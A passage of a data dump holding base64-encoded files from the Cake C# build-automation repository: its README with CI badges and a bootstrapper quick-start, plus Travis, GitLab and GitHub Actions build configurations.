bXByZXNzIGZpbGVzIGFuZCBidWlsZCBOdUdldCBwYWNrYWdlcy4KCiMjIENv
bnRpbnVvdXMgaW50ZWdyYXRpb24KCnwgQnVpbGQgc2VydmVyICAgICAgICAg
ICAgICAgIHwgUGxhdGZvcm0gICAgICB8IEJ1aWxkIHN0YXR1cyAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgfCBJbnRlZ3JhdGlvbiB0ZXN0cyAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfC0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tfC0tLS0tLS0tLS0tLS0tLXwt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS18LS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tfAp8IEF6dXJlIFBpcGVsaW5lcyAgICAgICAgICAg
ICB8IE1hY09TICAgICAgICAgfCBbIVtBenVyZSBQaXBlbGluZXMgTWFjIEJ1
aWxkIHN0YXR1c10oaHR0cHM6Ly9kZXYuYXp1cmUuY29tL2Nha2UtYnVpbGQv
Q2FrZS9fYXBpcy9idWlsZC9zdGF0dXMvQXp1cmUlMjBQaXBlbGluZXMlMjAt
JTIwQnVpbGQlMjBDYWtlJTIwTWFjPyZicmFuY2hOYW1lPWRldmVsb3ApXSho
dHRwczovL2Rldi5henVyZS5jb20vY2FrZS1idWlsZC9DYWtlL19idWlsZC9s
YXRlc3Q/ZGVmaW5pdGlvbklkPTQpIHwgfAp8IEF6dXJlIFBpcGVsaW5lcyAg
ICAgICAgICAgICB8IFdpbmRvd3MgICAgICAgfCBbIVtBenVyZSBQaXBlbGlu
ZXMgV2luZG93cyBCdWlsZCBzdGF0dXNdKGh0dHBzOi8vZGV2LmF6dXJlLmNv
bS9jYWtlLWJ1aWxkL0Nha2UvX2FwaXMvYnVpbGQvc3RhdHVzL0F6dXJlJTIw
UGlwZWxpbmVzJTIwLSUyMEJ1aWxkJTIwQ2FrZSUyMFdpbmRvd3M/JmJyYW5j
aE5hbWU9ZGV2ZWxvcCldKGh0dHBzOi8vZGV2LmF6dXJlLmNvbS9jYWtlLWJ1
aWxkL0Nha2UvX2J1aWxkL2xhdGVzdD9kZWZpbml0aW9uSWQ9MSkgfCB8Cnwg
QXp1cmUgUGlwZWxpbmVzICAgICAgICAgICAgIHwgRGViaWFuICAgICAgICB8
IFshW0F6dXJlIFBpcGVsaW5lcyBEZWJpYW4gQnVpbGQgc3RhdHVzXShodHRw
czovL2Rldi5henVyZS5jb20vY2FrZS1idWlsZC9DYWtlL19hcGlzL2J1aWxk
L3N0YXR1cy9BenVyZSUyMFBpcGVsaW5lcyUyMC0lMjBCdWlsZCUyMENha2Ul
MjBEZWJpYW4lMjBTdHJldGNoPyZicmFuY2hOYW1lPWRldmVsb3ApXShodHRw
czovL2Rldi5henVyZS5jb20vY2FrZS1idWlsZC9DYWtlL19idWlsZC9sYXRl
c3Q/ZGVmaW5pdGlvbklkPTcpIHwgfAp8IEF6dXJlIFBpcGVsaW5lcyAgICAg
ICAgICAgICB8IEZlZG9yYSAgICAgICAgfCBbIVtBenVyZSBQaXBlbGluZXMg
RmVkb3JhIEJ1aWxkIHN0YXR1c10oaHR0cHM6Ly9kZXYuYXp1cmUuY29tL2Nh
a2UtYnVpbGQvQ2FrZS9fYXBpcy9idWlsZC9zdGF0dXMvQXp1cmUlMjBQaXBl
bGluZXMlMjAtJTIwQnVpbGQlMjBDYWtlJTIwRmVkb3JhJTIwMjg/JmJyYW5j
aE5hbWU9ZGV2ZWxvcCldKGh0dHBzOi8vZGV2LmF6dXJlLmNvbS9jYWtlLWJ1
aWxkL0Nha2UvX2J1aWxkL2xhdGVzdD9kZWZpbml0aW9uSWQ9NikgfCB8Cnwg
QXp1cmUgUGlwZWxpbmVzICAgICAgICAgICAgIHwgQ2VudG9zICAgICAgICB8
IFshW0F6dXJlIFBpcGVsaW5lcyBDYWtlIENlbnRvcyBzdGF0dXNdKGh0dHBz
Oi8vZGV2LmF6dXJlLmNvbS9jYWtlLWJ1aWxkL0Nha2UvX2FwaXMvYnVpbGQv
c3RhdHVzL0F6dXJlJTIwUGlwZWxpbmVzJTIwLSUyMEJ1aWxkJTIwQ2FrZSUy
MENlbnRvcyUyMDc/JmJyYW5jaE5hbWU9ZGV2ZWxvcCldKGh0dHBzOi8vZGV2
LmF6dXJlLmNvbS9jYWtlLWJ1aWxkL0Nha2UvX2J1aWxkL2xhdGVzdD9kZWZp
bml0aW9uSWQ9NSkgfCB8CnwgQXp1cmUgUGlwZWxpbmVzICAgICAgICAgICAg
IHwgVWJ1bnR1ICAgICAgICB8IFshW0F6dXJlIFBpcGVsaW5lcyBVYnVudHUg
QnVpbGQgc3RhdHVzXShodHRwczovL2Rldi5henVyZS5jb20vY2FrZS1idWls
ZC9DYWtlL19hcGlzL2J1aWxkL3N0YXR1cy9BenVyZSUyMFBpcGVsaW5lcyUy
MC0lMjBCdWlsZCUyMENha2UlMjBVYnVudHU/JmJyYW5jaE5hbWU9ZGV2ZWxv
cCldKGh0dHBzOi8vZGV2LmF6dXJlLmNvbS9jYWtlLWJ1aWxkL0Nha2UvX2J1
aWxkL2xhdGVzdD9kZWZpbml0aW9uSWQ9MykgfCB8CnwgQXBwVmV5b3IgICAg
ICAgICAgICAgICAgICAgIHwgV2luZG93cyAgICAgICB8IFshW0FwcFZleW9y
IGJyYW5jaF0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9hcHB2ZXlvci9jaS9j
YWtlYnVpbGQvY2FrZS9kZXZlbG9wLnN2ZyldKGh0dHBzOi8vY2kuYXBwdmV5
b3IuY29tL3Byb2plY3QvY2FrZWJ1aWxkL2Nha2UvYnJhbmNoL2RldmVsb3Ap
ICAgICAgICAgICAgICAgICAgfCBbIVtBcHBWZXlvciBicmFuY2hdKGh0dHBz
Oi8vaW1nLnNoaWVsZHMuaW8vYXBwdmV5b3IvY2kvY2FrZWJ1aWxkL2Nha2Ut
ZWlqd2ovZGV2ZWxvcC5zdmcpXShodHRwczovL2NpLmFwcHZleW9yLmNvbS9w
cm9qZWN0L2Nha2VidWlsZC9jYWtlLWVpandqKSAgfAp8IFRyYXZpcyAgICAg
ICAgICAgICAgICAgICAgICB8IExpbnV4IC8gTWFjT1MgfCBbIVtUcmF2aXMg
YnVpbGQgc3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5vcmcvY2FrZS1idWls
ZC9jYWtlLnN2Zz9icmFuY2g9ZGV2ZWxvcCldKGh0dHBzOi8vdHJhdmlzLWNp
Lm9yZy9jYWtlLWJ1aWxkL2Nha2UpICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICB8CnwgVGVhbUNpdHkgICAgICAgICAgICAgICAgICAgIHwgV2luZG93
cyAgICAgICB8IFshW1RlYW1DaXR5IEJ1aWxkIFN0YXR1c10oaHR0cDovL2lt
Zy5zaGllbGRzLmlvL3RlYW1jaXR5L2NvZGViZXR0ZXIvQ2FrZV9DYWtlTWFz
dGVyLnN2ZyldKGh0dHA6Ly90ZWFtY2l0eS5jb2RlYmV0dGVyLmNvbS92aWV3
VHlwZS5odG1sP2J1aWxkVHlwZUlkPUNha2VfQ2FrZU1hc3RlcikgfCAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBCaXRyaXNlICAgICAgICAg
ICAgICAgICAgICAgfCBNYWNPUyAgICAgICAgIHwgWyFbQnVpbGQgU3RhdHVz
XShodHRwczovL2FwcC5iaXRyaXNlLmlvL2FwcC80MmVhZWY3N2U4ZGI0YTVj
L3N0YXR1cy5zdmc/dG9rZW49RURqSEdLNW5qTkotTXJoU2J2S00xdyZicmFu
Y2g9ZGV2ZWxvcCldKGh0dHBzOi8vYXBwLmJpdHJpc2UuaW8vYXBwLzQyZWFl
Zjc3ZThkYjRhNWMpICB8ICFbQnVpbGQgU3RhdHVzXShodHRwczovL2FwcC5i
aXRyaXNlLmlvL2FwcC84MDRiNDMxYzFmMjdlMGEwL3N0YXR1cy5zdmc/dG9r
ZW49cUtvc0hFYUpBSkVxelpjcTRzNVdSZyZicmFuY2g9ZGV2ZWxvcCkgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHwKfCBCaXRyaXNlICAgICAgICAgICAgICAgICAgICAgfCBMaW51
eCAgICAgICAgIHwgWyFbQnVpbGQgU3RhdHVzXShodHRwczovL2FwcC5iaXRy
aXNlLmlvL2FwcC9lYTBjNmIzYzYxZWIxZTc5L3N0YXR1cy5zdmc/dG9rZW49
S0pxT1dYbGxZWHozV1lxY0I4NjFVdyZicmFuY2g9ZGV2ZWxvcCldKGh0dHBz
Oi8vYXBwLmJpdHJpc2UuaW8vYXBwL2VhMGM2YjNjNjFlYjFlNzkpICB8ICFb
QnVpbGQgU3RhdHVzXShodHRwczovL2FwcC5iaXRyaXNlLmlvL2FwcC81YTQw
NmYzNGYyMjExM2M2L3N0YXR1cy5zdmc/dG9rZW49VFFQYnNtQTl5UC1pSk9o
enVuSVA0dyZicmFuY2g9ZGV2ZWxvcCkgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBNeUdldCBC
dWlsZCBTZXJ2aWNlcyAgICAgICAgfCBXaW5kb3dzICAgICAgIHwgWyFbTXlH
ZXQgQnVpbGQgU3RhdHVzXShodHRwczovL3d3dy5teWdldC5vcmcvQnVpbGRT
b3VyY2UvQmFkZ2UvY2FrZS1teWdldC1idWlsZC1zZXJ2aWNlP2lkZW50aWZp
ZXI9NTM1MTM1NDYtMDUwZS00NWRlLTk1MDAtZjE2MWM5OWRmNmUyKV0oaHR0
cHM6Ly93d3cubXlnZXQub3JnLykgICB8ICAmbmJzcDsgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgfAp8IEJpdGJ1Y2tldCBQaXBlbGluZXMgICAgICAgICB8IExp
bnV4ICAgICAgICAgfCBbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vY2FrZWJp
dGJ1Y2tldHBpcGVsaW5lc3NoaWVsZC5henVyZXdlYnNpdGVzLm5ldC9zdGF0
dXMvY2FrZWJ1aWxkL2Nha2UtaW50ZWdyYXRpb24tdGVzdHMvZGV2ZWxvcCld
KGh0dHBzOi8vY2FrZWJpdGJ1Y2tldHBpcGVsaW5lc3NoaWVsZC5henVyZXdl
YnNpdGVzLm5ldC91cmwvY2FrZWJ1aWxkL2Nha2UtaW50ZWdyYXRpb24tdGVz
dHMvZGV2ZWxvcCkgfCAgfAp8IEdpdExhYiAgICAgICAgICAgICAgICAgICAg
ICB8IExpbnV4ICAgICAgfCBbIVtidWlsZCBzdGF0dXNdKGh0dHBzOi8vZ2l0
bGFiLmNvbS9jYWtlLWJ1aWxkL2Nha2UvYmFkZ2VzL2RldmVsb3AvYnVpbGQu
c3ZnKV0oaHR0cHM6Ly9naXRsYWIuY29tL2Nha2UtYnVpbGQvY2FrZS9idWls
ZHMpIHwgICZuYnNwOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgR2l0SHVi
IEFjdGlvbnMgICAgICAgICAgICAgIHwgTi9BICAgICAgICAgfCBbIVtCdWls
ZCBTdGF0dXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9jYWtlLWJ1aWxkL2Nha2Uv
d29ya2Zsb3dzL0J1aWxkL2JhZGdlLnN2Zz9icmFuY2g9ZGV2ZWxvcCldKGh0
dHBzOi8vZ2l0aHViLmNvbS9jYWtlLWJ1aWxkL2Nha2UvYWN0aW9ucykgfCAm
bmJzcDsgfAoKIyMgQ29kZSBDb3ZlcmFnZQoKWyFbQ292ZXJhZ2UgU3RhdHVz
XShodHRwczovL2NvdmVyYWxscy5pby9yZXBvcy9naXRodWIvY2FrZS1idWls
ZC9jYWtlL2JhZGdlLnN2Zz9icmFuY2g9ZGV2ZWxvcCldKGh0dHBzOi8vY292
ZXJhbGxzLmlvL2dpdGh1Yi9jYWtlLWJ1aWxkL2Nha2U/YnJhbmNoPWRldmVs
b3ApCgojIyBUYWJsZSBvZiBDb250ZW50cwoKMS4gW0RvY3VtZW50YXRpb25d
KGh0dHBzOi8vZ2l0aHViLmNvbS9jYWtlLWJ1aWxkL2Nha2UjZG9jdW1lbnRh
dGlvbikKMi4gW0V4YW1wbGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9jYWtlLWJ1
aWxkL2Nha2UjZXhhbXBsZSkKICAgIC0gW0luc3RhbGwgdGhlIENha2UgYm9v
dHN0cmFwcGVyXShodHRwczovL2dpdGh1Yi5jb20vY2FrZS1idWlsZC9jYWtl
IzEtaW5zdGFsbC10aGUtY2FrZS1ib290c3RyYXBwZXIpCiAgICAtIFtDcmVh
dGUgYSBDYWtlIHNjcmlwdF0oaHR0cHM6Ly9naXRodWIuY29tL2Nha2UtYnVp
bGQvY2FrZSMyLWNyZWF0ZS1hLWNha2Utc2NyaXB0KQogICAgLSBbUnVuIGl0
IV0oaHR0cHM6Ly9naXRodWIuY29tL2Nha2UtYnVpbGQvY2FrZSMzLXJ1bi1p
dCkKMy4gW0NvbnRyaWJ1dGluZ10oaHR0cHM6Ly9naXRodWIuY29tL2Nha2Ut
YnVpbGQvY2FrZSNjb250cmlidXRpbmcpCjQuIFtHZXQgaW4gdG91Y2hdKGh0
dHBzOi8vZ2l0aHViLmNvbS9jYWtlLWJ1aWxkL2Nha2UjZ2V0LWluLXRvdWNo
KQo1LiBbTGljZW5zZV0oaHR0cHM6Ly9naXRodWIuY29tL2Nha2UtYnVpbGQv
Y2FrZSNsaWNlbnNlKQoKIyMgRG9jdW1lbnRhdGlvbgoKWW91IGNhbiByZWFk
IHRoZSBsYXRlc3QgZG9jdW1lbnRhdGlvbiBhdCBbaHR0cHM6Ly9jYWtlYnVp
bGQubmV0L10oaHR0cHM6Ly9jYWtlYnVpbGQubmV0LykuCgojIyBFeGFtcGxl
CgpUaGlzIGV4YW1wbGUgZG93bmxvYWRzIHRoZSBDYWtlIGJvb3RzdHJhcHBl
ciBhbmQgZXhlY3V0ZXMgYSBzaW1wbGUgYnVpbGQgc2NyaXB0LgpUaGUgYm9v
dHN0cmFwcGVyIGlzIHVzZWQgdG8gYm9vdHN0cmFwIENha2UgaW4gYSBzaW1w
bGUgd2F5IGFuZCBpcyBub3QgaW4KcmVxdWlyZWQgaW4gYW55IHdheSB0byBl
eGVjdXRlIGJ1aWxkIHNjcmlwdHMuIElmIHlvdSBwcmVmZXIgdG8gaW52b2tl
IHRoZSBDYWtlCmV4ZWN1dGFibGUgeW91cnNlbGYsIFt0YWtlIGEgbG9vayBh
dCB0aGUgY29tbWFuZCBsaW5lIHVzYWdlXShodHRwczovL2Nha2VidWlsZC5u
ZXQvZG9jcy9jbGkvdXNhZ2UpLgoKVGhpcyBleGFtcGxlIGlzIGFsc28gYXZh
aWxhYmxlIG9uIG91ciBob21lcGFnZToKW2h0dHBzOi8vY2FrZWJ1aWxkLm5l
dC9kb2NzL3R1dG9yaWFscy9zZXR0aW5nLXVwLWEtbmV3LXByb2plY3RdKGh0
dHBzOi8vY2FrZWJ1aWxkLm5ldC9kb2NzL3R1dG9yaWFscy9zZXR0aW5nLXVw
LWEtbmV3LXByb2plY3QpCgojIyMgMS4gSW5zdGFsbCB0aGUgQ2FrZSBib290
c3RyYXBwZXIKClRoZSBib290c3RyYXBwZXIgaXMgdXNlZCB0byBkb3dubG9h
ZCBDYWtlIGFuZCB0aGUgdG9vbHMgcmVxdWlyZWQgYnkgdGhlCmJ1aWxkIHNj
cmlwdC4KCiMjIyMjIFdpbmRvd3MKCmBgYHBvd2Vyc2hlbGwKSW52b2tlLVdl
YlJlcXVlc3QgaHR0cHM6Ly9jYWtlYnVpbGQubmV0L2Rvd25sb2FkL2Jvb3Rz
dHJhcHBlci93aW5kb3dzIC1PdXRGaWxlIGJ1aWxkLnBzMQpgYGAKCiMjIyMj
IExpbnV4CgpgYGBjb25zb2xlCmN1cmwgLUxzZm8gYnVpbGQuc2ggaHR0cHM6
Ly9jYWtlYnVpbGQubmV0L2Rvd25sb2FkL2Jvb3RzdHJhcHBlci9saW51eApg
YGAKCiMjIyMjIE9TIFgKCmBgYGNvbnNvbGUKY3VybCAtTHNmbyBidWlsZC5z
aCBodHRwczovL2Nha2VidWlsZC5uZXQvZG93bmxvYWQvYm9vdHN0cmFwcGVy
L29zeApgYGAKCiMjIyAyLiBDcmVhdGUgYSBDYWtlIHNjcmlwdAoKQWRkIGEg
Y2FrZSBzY3JpcHQgY2FsbGVkIGBidWlsZC5jYWtlYCB0byB0aGUgc2FtZSBs
b2NhdGlvbiBhcyB0aGUKYm9vdHN0cmFwcGVyIHNjcmlwdCB0aGF0IHlvdSBk
b3dubG9hZGVkLgoKYGBgY2FrZQp2YXIgdGFyZ2V0ID0gQXJndW1lbnQoInRh
cmdldCIsICJEZWZhdWx0Iik7CgpUYXNrKCJEZWZhdWx0IikKICAuRG9lcygo
KSA9Pgp7CiAgSW5mb3JtYXRpb24oIkhlbGxvIFdvcmxkISIpOwp9KTsKClJ1
blRhcmdldCh0YXJnZXQpOwpgYGAKCiMjIyAzLiBSdW4gaXQhCgojIyMjIyBX
aW5kb3dzCgpgYGBwb3dlcnNoZWxsCiMgRXhlY3V0ZSB0aGUgYm9vdHN0cmFw
cGVyIHNjcmlwdC4KLi9idWlsZC5wczEKYGBgCgojIyMjIyBMaW51eCAvIE9T
IFgKCmBgYGNvbnNvbGUKIyBBZGp1c3QgdGhlIHBlcm1pc3Npb25zIGZvciB0
aGUgYm9vdHN0cmFwcGVyIHNjcmlwdC4KY2htb2QgK3ggYnVpbGQuc2gKCiMg
RXhlY3V0ZSB0aGUgYm9vdHN0cmFwcGVyIHNjcmlwdC4KLi9idWlsZC5zaApg
YGAKCiMjIENvbnRyaWJ1dGluZwoKU28geW914oCZcmUgdGhpbmtpbmcgYWJv
dXQgY29udHJpYnV0aW5nIHRvIENha2U/IEdyZWF0ISBJdOKAmXMgKipyZWFs
bHkqKiBhcHByZWNpYXRlZC4KCk1ha2Ugc3VyZSB5b3UndmUgcmVhZCB0aGUg
W2NvbnRyaWJ1dGlvbiBndWlkZWxpbmVzXShodHRwczovL2Nha2VidWlsZC5u
ZXQvZG9jcy9jb250cmlidXRpbmcvY29udHJpYnV0aW9uLWd1aWRlbGluZXMp
IGJlZm9yZSBzZW5kaW5nIHRoYXQgZXBpYyBwdWxsIHJlcXVlc3QuIFlvdSds
bCBhbHNvIG5lZWQgdG8gc2lnbiB0aGUgW2NvbnRyaWJ1dGlvbiBsaWNlbnNl
IGFncmVlbWVudF0oaHR0cHM6Ly9jbGEuZG90bmV0Zm91bmRhdGlvbi5vcmcv
Y2FrZS1idWlsZC9jYWtlKSAoQ0xBKSBmb3IgYW55dGhpbmcgb3RoZXIgdGhh
biBhIHRyaXZpYWwgY2hhbmdlLiAgKipOT1RFOioqIFRoZSAuTkVUIEZvdW5k
YXRpb24gQ0xBIEJvdCB3aWxsIHByb3ZpZGUgYSBsaW5rIHRvIHRoaXMgQ0xB
IHdpdGhpbiB0aGUgUFIgdGhhdCB5b3Ugc3VibWl0IGlmIGl0IGlzIGRlZW1l
ZCBhcyByZXF1aXJlZC4KCiogRm9yayB0aGUgcmVwb3NpdG9yeS4KKiBDcmVh
dGUgYSBicmFuY2ggdG8gd29yayBpbi4KKiBNYWtlIHlvdXIgZmVhdHVyZSBh
ZGRpdGlvbiBvciBidWcgZml4LgoqIERvbid0IGZvcmdldCB0aGUgdW5pdCB0
ZXN0cy4KKiBTZW5kIGEgcHVsbCByZXF1ZXN0LgoKIyMgR2V0IGluIHRvdWNo
CgpbIVtGb2xsb3cgQGNha2VidWlsZG5ldF0oaHR0cHM6Ly9pbWcuc2hpZWxk
cy5pby9iYWRnZS9Ud2l0dGVyLUZvbGxvdyUyMCU0MGNha2VidWlsZG5ldC1i
bHVlLnN2ZyldKGh0dHBzOi8vdHdpdHRlci5jb20vaW50ZW50L2ZvbGxvdz9z
Y3JlZW5fbmFtZT1jYWtlYnVpbGRuZXQpCgpbIVtKb2luIHRoZSBjaGF0IGF0
IGh0dHBzOi8vZ2l0dGVyLmltL2Nha2UtYnVpbGQvY2FrZV0oaHR0cHM6Ly9i
YWRnZXMuZ2l0dGVyLmltL0pvaW4lMjBDaGF0LnN2ZyldKGh0dHBzOi8vZ2l0
dGVyLmltL2Nha2UtYnVpbGQvY2FrZT91dG1fc291cmNlPWJhZGdlJnV0bV9t
ZWRpdW09YmFkZ2UmdXRtX2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50
PWJhZGdlKQoKIyMgTGljZW5zZQoKQ29weXJpZ2h0IMKpIC5ORVQgRm91bmRh
dGlvbiwgUGF0cmlrIFN2ZW5zc29uLCBNYXR0aWFzIEthcmxzc29uLCBHYXJ5
IEV3YW4gUGFyaywgQWxpc3RhaXIgQ2hhcG1hbiwgTWFydGluIEJqw7Zya3N0
csO2bSwgRGF2ZSBHbGljaywgUGFzY2FsIEJlcmdlciwgSsOpcsOpbWllIERl
c2F1dGVscyBhbmQgY29udHJpYnV0b3JzLgoKQ2FrZSBpcyBwcm92aWRlZCBh
cy1pcyB1bmRlciB0aGUgTUlUIGxpY2Vuc2UuIEZvciBtb3JlIGluZm9ybWF0
aW9uIHNlZSBbTElDRU5TRV0oaHR0cHM6Ly9naXRodWIuY29tL2Nha2UtYnVp
bGQvY2FrZS9ibG9iL2RldmVsb3AvTElDRU5TRSkuCgoqIEZvciBSb3NseW4s
IHNlZSBodHRwczovL2dpdGh1Yi5jb20vZG90bmV0L3Jvc2x5bi9ibG9iL21h
c3Rlci9MaWNlbnNlLnR4dAoqIEZvciBBdXRvZmFjLCBzZWUgaHR0cHM6Ly9n
aXRodWIuY29tL2F1dG9mYWMvQXV0b2ZhYy9ibG9iL21hc3Rlci9MSUNFTlNF
CiogRm9yIE51R2V0LkNvcmUsIHNlZSBodHRwczovL2dpdGh1Yi5jb20vTnVH
ZXQvSG9tZS9ibG9iL2Rldi9MSUNFTlNFLnR4dAoKIyMgVGhhbmtzCgpBIGJp
ZyB0aGFuayB5b3UgaGFzIHRvIGdvIHRvIFtKZXRCcmFpbnNdKGh0dHBzOi8v
d3d3LmpldGJyYWlucy5jb20pIHdobyBwcm92aWRlIGVhY2ggb2YgdGhlIENh
a2UgRGV2ZWxvcGVycyB3aXRoIGFuIFtPcGVuIFNvdXJjZSBMaWNlbnNlXSho
dHRwczovL3d3dy5qZXRicmFpbnMuY29tL3N1cHBvcnQvY29tbXVuaXR5LyNz
ZWN0aW9uPW9wZW4tc291cmNlKSBmb3IgW1JlU2hhcnBlcl0oaHR0cHM6Ly93
d3cuamV0YnJhaW5zLmNvbS9yZXNoYXJwZXIvKSB0aGF0IGhlbHBzIHdpdGgg
dGhlIGRldmVsb3BtZW50IG9mIENha2UuCgojIyBDb2RlIG9mIENvbmR1Y3QK
ClRoaXMgcHJvamVjdCBoYXMgYWRvcHRlZCB0aGUgY29kZSBvZiBjb25kdWN0
IGRlZmluZWQgYnkgdGhlIFtDb250cmlidXRvciBDb3ZlbmFudF0oaHR0cDov
L2NvbnRyaWJ1dG9yLWNvdmVuYW50Lm9yZy8pCnRvIGNsYXJpZnkgZXhwZWN0
ZWQgYmVoYXZpb3IgaW4gb3VyIGNvbW11bml0eS4KRm9yIG1vcmUgaW5mb3Jt
YXRpb24gc2VlIHRoZSBbLk5FVCBGb3VuZGF0aW9uIENvZGUgb2YgQ29uZHVj
dF0oaHR0cDovL3d3dy5kb3RuZXRmb3VuZGF0aW9uLm9yZy9jb2RlLW9mLWNv
bmR1Y3QpLgoKIyMgQ29udHJpYnV0aW9uIExpY2Vuc2UgQWdyZWVtZW50CgpC
eSBzaWduaW5nIHRoZSBbQ0xBXShodHRwczovL2NsYS5kb3RuZXRmb3VuZGF0
aW9uLm9yZy9jYWtlLWJ1aWxkL2Nha2UpLCB0aGUgY29tbXVuaXR5IGlzIGZy
ZWUgdG8gdXNlIHlvdXIgY29udHJpYnV0aW9uIHRvIC5ORVQgRm91bmRhdGlv
biBwcm9qZWN0cy4KCiMjIC5ORVQgRm91bmRhdGlvbgoKVGhpcyBwcm9qZWN0
IGlzIHN1cHBvcnRlZCBieSB0aGUgWy5ORVQgRm91bmRhdGlvbl0oaHR0cDov
L3d3dy5kb3RuZXRmb3VuZGF0aW9uLm9yZykuCg==
",,"bGFuZ3VhZ2U6IGNzaGFycApvczoKICAtIG9zeAogIC0gbGludXgKCiMgVWJ1
bnR1IDE2LjA0CnN1ZG86IHJlcXVpcmVkCmRpc3Q6IGJpb25pYwoKIyBPUyBY
IDEwLjEyCm9zeF9pbWFnZTogeGNvZGUxMS4yCgptb25vOgogIC0gNS4xMi4w
CiAgLSA1LjIwLjEKCmRvdG5ldDogMy4wLjEwMAoKYmVmb3JlX2luc3RhbGw6
CiAgLSBnaXQgZmV0Y2ggLS11bnNoYWxsb3cgIyBUcmF2aXMgYWx3YXlzIGRv
ZXMgYSBzaGFsbG93IGNsb25lLCBidXQgR2l0VmVyc2lvbiBuZWVkcyB0aGUg
ZnVsbCBoaXN0b3J5IGluY2x1ZGluZyBicmFuY2hlcyBhbmQgdGFncwogIC0g
Z2l0IGNvbmZpZyByZW1vdGUub3JpZ2luLmZldGNoICIrcmVmcy9oZWFkcy8q
OnJlZnMvcmVtb3Rlcy9vcmlnaW4vKiIKICAtIGdpdCBmZXRjaCBvcmlnaW4K
CnNjcmlwdDoKICAtIC4vYnVpbGQuc2ggLS10YXJnZXQ9IlRyYXZpcyIKCmNh
Y2hlOgogIGRpcmVjdG9yaWVzOgogICAgLSAucGFja2FnZXMKICAgIC0gdG9v
bHMvQWRkaW5zCiAgICAtIHRvb2xzL2dpdHJlbGVhc2VtYW5hZ2VyCiAgICAt
IHRvb2xzL0dpdFZlcnNpb24uQ29tbWFuZExpbmU=
",,,,,,,,,,,,,,,,,,,,,,,,"aW1hZ2U6IGNha2VidWlsZC9jYWtlOjIuMS1zZGstbW9ubwpzdGFnZXM6Ci0g
YnVpbGQKCmJ1aWxkX2pvYjoKICBzdGFnZTogYnVpbGQKICBzY3JpcHQ6CiAg
LSAuL2J1aWxkLnNoIC0tdGFyZ2V0PSJSdW4tVW5pdC1UZXN0cyIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogQnVpbGQKb246CiAgcHVsbF9yZXF1ZXN0OgogIHB1c2g6CiAgICBi
cmFuY2hlczoKICAgICAgLSBtYWluCiAgICAgIC0gZGV2ZWxvcApqb2JzOgog
IGJ1aWxkOgogICAgbmFtZTogQnVpbGQKICAgIHJ1bnMtb246ICR7eyBtYXRy
aXgub3MgfX0KICAgIHN0cmF0ZWd5OgogICAgICBtYXRyaXg6CiAgICAgICAg
b3M6IFt3aW5kb3dzLWxhdGVzdCwgdWJ1bnR1LWxhdGVzdCwgbWFjb3MtbGF0
ZXN0XQogICAgc3RlcHM6CiAgICAgIC0gbmFtZTogR2V0IHRoZSBzb3VyY2Vz
CiAgICAgICAgdXNlczogYWN0aW9ucy9jaGVja291dEB2MQoKICAgICAgLSBu
